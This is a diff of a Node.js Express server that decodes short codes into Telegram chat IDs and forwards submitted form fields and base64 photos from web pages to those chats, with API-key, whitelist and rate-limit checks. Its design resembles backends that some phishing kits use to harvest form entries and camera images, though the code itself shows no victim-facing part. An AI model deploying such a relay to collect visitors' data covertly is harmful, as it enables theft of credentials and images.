@@ -1,20 +1,22 @@
 
+// /api/server.js
 const express = require("express");
 const bodyParser = require("body-parser");
+const fetch = require("node-fetch");
 const FormData = require("form-data");
-const serverless = require("serverless-http");
+require("dotenv").config();
 
 const app = express();
-app.use(bodyParser.json({ limit: "10mb" }));
+app.use(bodyParser.json({ limit: '10mb' })); // ⚠️ Important pour les photos en base64
 
-// ---------------- CONFIG ----------------
+// --- Config
 const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
 const CODE_LENGTH = 6;
 const RATE_LIMIT_WINDOW_MS = 60 * 1000;
 const RATE_LIMIT_MAX = 20;
 const rateMap = new Map();
 
-// ---------------- HELPERS ----------------
+// --- Helpers
 function encodeUid(uid) {
   uid = Number(uid);
   if (!Number.isFinite(uid) || uid < 0) throw new Error("uid must be a non-negative integer");
@@ -31,29 +33,25 @@ function decodeCode(code) {
   let decoded = 0;
   for (let i = 0; i < code.length; i++) {
     const idx = CHARS.indexOf(code[i]);
-    if (idx === -1) throw new Error("invalid character");
+    if (idx === -1) throw new Error("Invalid code character");
     decoded = decoded * 64 + idx;
   }
   return decoded;
 }
 
 function escapeHtml(str = "") {
-  return String(str)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
+  return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-// ---------------- SECURITY ----------------
 function requireApiKeyMiddleware(req, res, next) {
   const required = process.env.API_KEY || "";
-  if (!required) return res.status(500).send("API_KEY missing");
+  if (!required) return res.status(500).send("Server not configured (API_KEY missing)");
   const provided = String(req.headers["x-api-key"] || "");
-  if (provided !== required) return res.status(401).send("Unauthorized");
+  if (provided !== required) return res.status(401).send("Unauthorized (invalid API key)");
   next();
 }
 
-// ---------------- CORS ----------------
+// --- CORS
 const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || "*";
 app.use((req, res, next) => {
   res.setHeader("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
@@ -63,11 +61,11 @@ app.use((req, res, next) => {
   next();
 });
 
-// ---------------- WHITELIST & RATE LIMIT ----------------
+// --- Whitelist & Rate Limit
 function isUidWhitelisted(uid) {
   const raw = process.env.WHITELIST || "";
   if (!raw.trim()) return true;
-  const list = raw.split(",").map(s => s.trim());
+  const list = raw.split(",").map(s => s.trim()).filter(Boolean);
   return list.includes(String(uid));
 }
 
@@ -83,105 +81,114 @@ function checkRateLimit(uid) {
   return entry.count <= RATE_LIMIT_MAX;
 }
 
-// ---------------- ROUTES ----------------
+// --- Routes
 
-// Encode UID
+// Encode
 app.post("/api/encode", requireApiKeyMiddleware, (req, res) => {
   const { uid } = req.body || {};
-  if (uid === undefined) return res.status(400).json({ error: "uid missing" });
+  if (uid === undefined || uid === null) return res.status(400).json({ error: "uid missing" });
   try {
-    res.json({ code: encodeUid(uid) });
+    const code = encodeUid(uid);
+    return res.json({ code });
   } catch (e) {
-    res.status(400).json({ error: e.message });
+    return res.status(400).json({ error: e.message || "invalid uid" });
   }
 });
 
-// Decode code
+// Decode
 app.post("/api/decode", requireApiKeyMiddleware, (req, res) => {
   const { code } = req.body || {};
   if (!code) return res.status(400).json({ error: "code missing" });
   try {
-    res.json({ uid: String(decodeCode(code)) });
+    const uid = decodeCode(String(code));
+    return res.json({ uid: String(uid) });
   } catch (e) {
-    res.status(400).json({ error: e.message });
+    return res.status(400).json({ error: e.message || "invalid code" });
   }
 });
 
-// Submit form → Telegram
+// Submit form
 app.post("/api/submit", async (req, res) => {
   const { code, source, form } = req.body || {};
-  if (!code || !form) return res.status(400).send("invalid payload");
+  if (!code || !form || typeof form !== "object") return res.status(400).send("code or form missing/invalid");
 
   let uid;
-  try {
-    uid = String(decodeCode(code));
-  } catch {
-    return res.status(400).send("invalid code");
-  }
+  try { uid = String(decodeCode(String(code))); } 
+  catch { return res.status(400).send("invalid code"); }
 
-  if (!checkRateLimit(uid)) return res.status(429).send("rate limit");
+  const providedKey = String(req.headers["x-api-key"] || "");
+  const requiredKey = process.env.API_KEY || "";
+  const isOwnerCall = requiredKey && providedKey === requiredKey;
+
+  if (!isOwnerCall && !isUidWhitelisted(uid)) return res.status(403).send("Target UID not allowed");
+  if (!checkRateLimit(uid)) return res.status(429).send("Too many requests (rate limit)");
+
+  const clean = (s) => escapeHtml(String(s || ""));
+  const lines = Object.entries(form)
+    .map(([k, v]) => `• <b>${clean(k)}:</b> ${clean(v)}`)
+    .join("\n");
 
   const botToken = process.env.TELEGRAM_TOKEN;
-  if (!botToken) return res.status(500).send("TELEGRAM_TOKEN missing");
+  if (!botToken) return res.status(500).send("Server misconfigured (missing TELEGRAM_TOKEN)");
 
-  const text =
-    `<b>UID :</b> ${escapeHtml(uid)}\n` +
-    `<b>Source :</b> ${escapeHtml(source || "unknown")}\n\n` +
-    Object.entries(form)
-      .map(([k, v]) => `• <b>${escapeHtml(k)}:</b> ${escapeHtml(v)}`)
-      .join("\n");
+  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const text = `<b>Page :</b> ${clean(source || "unknown")}\n<b>UID :</b> ${clean(uid)}\n\n<b>Formulaire :</b>\n${lines}`;
 
-  const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: uid,
-      text,
-      parse_mode: "HTML",
-      disable_web_page_preview: true,
-    }),
-  });
-
-  if (!resp.ok) return res.status(502).send("telegram error");
-  res.send("ok");
+  try {
+    const resp = await fetch(telegramUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: uid, text, parse_mode: "HTML", disable_web_page_preview: true }),
+    });
+    const j = await resp.json();
+    if (!resp.ok || !j.ok) return res.status(502).send("Telegram API error");
+    return res.status(200).send("Formulaire envoyé ✅");
+  } catch (err) {
+    return res.status(502).send("Network error");
+  }
 });
 
-// Submit photo → Telegram
+// Submit photo
 app.post("/api/submit-photo", async (req, res) => {
   const { code, source, photo } = req.body || {};
-  if (!code || !photo) return res.status(400).send("missing code or photo");
+  if (!code || !photo) return res.status(400).send("code or photo missing");
 
   let uid;
-  try {
-    uid = String(decodeCode(code));
-  } catch {
-    return res.status(400).send("invalid code");
-  }
+  try { uid = String(decodeCode(String(code))); } 
+  catch { return res.status(400).send("invalid code"); }
 
-  if (!checkRateLimit(uid)) return res.status(429).send("rate limit");
+  const providedKey = String(req.headers["x-api-key"] || "");
+  const requiredKey = process.env.API_KEY || "";
+  const isOwnerCall = requiredKey && providedKey === requiredKey;
+
+  if (!isOwnerCall && !isUidWhitelisted(uid)) return res.status(403).send("Target UID not allowed");
+  if (!checkRateLimit(uid)) return res.status(429).send("Too many requests (rate limit)");
 
   const botToken = process.env.TELEGRAM_TOKEN;
-  if (!botToken) return res.status(500).send("TELEGRAM_TOKEN missing");
+  if (!botToken) return res.status(500).send("Server misconfigured");
 
+  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
   const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
   const buffer = Buffer.from(base64Data, "base64");
 
-  const formData = new FormData();
-  formData.append("chat_id", uid);
-  formData.append("photo", buffer, { filename: "photo.jpg" });
-  if (source) formData.append("caption", `📸 ${source}`);
+  try {
+    const form = new FormData();
+    form.append("chat_id", uid);
+    form.append("photo", buffer, { filename: "photo.jpg" });
+    if (source) form.append("caption", `📸 ${source}`);
 
-  const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-    method: "POST",
-    body: formData,
-    headers: formData.getHeaders(),
-  });
-
-  if (!resp.ok) return res.status(502).send("telegram error");
-  res.send("photo sent");
+    const resp = await fetch(telegramUrl, { method: "POST", body: form, headers: form.getHeaders() });
+    const j = await resp.json();
+    if (!resp.ok || !j.ok) return res.status(502).send("Telegram API error");
+    return res.status(200).send("Photo envoyée ✅");
+  } catch (err) {
+    return res.status(502).send("Network error");
+  }
 });
 
-// Health check
+// Default route
 app.get("/api", (req, res) => res.send("API ready ✅"));
 
-module.exports = serverless(app);
+// --- Start server pour Render
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
